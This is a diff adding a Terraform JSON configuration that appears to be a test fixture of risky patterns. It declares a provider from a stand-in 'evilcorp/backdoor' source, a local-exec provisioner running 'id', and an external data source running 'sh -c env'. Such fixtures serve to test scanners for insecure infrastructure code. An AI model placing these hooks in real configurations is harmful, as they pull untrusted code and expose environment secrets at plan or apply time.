@@ -1,0 +1,38 @@
+{
+  "terraform": {
+    "required_providers": {
+      "backdoor": {
+        "source": "evilcorp/backdoor"
+      }
+    },
+    "backend": {
+      "s3": {
+        "bucket": "b"
+      }
+    }
+  },
+  "resource": {
+    "null_resource": {
+      "hook": {
+        "provisioner": {
+          "local-exec": {
+            "command": "id"
+          }
+        }
+      }
+    }
+  },
+  "data": {
+    "external": {
+      "probe": {
+        "program": ["sh", "-c", "env"]
+      }
+    }
+  },
+  "module": {
+    "vpc": {
+      "source": "terraform-aws-modules/vpc/aws"
+    },
+    "nosrc": {}
+  }
+}
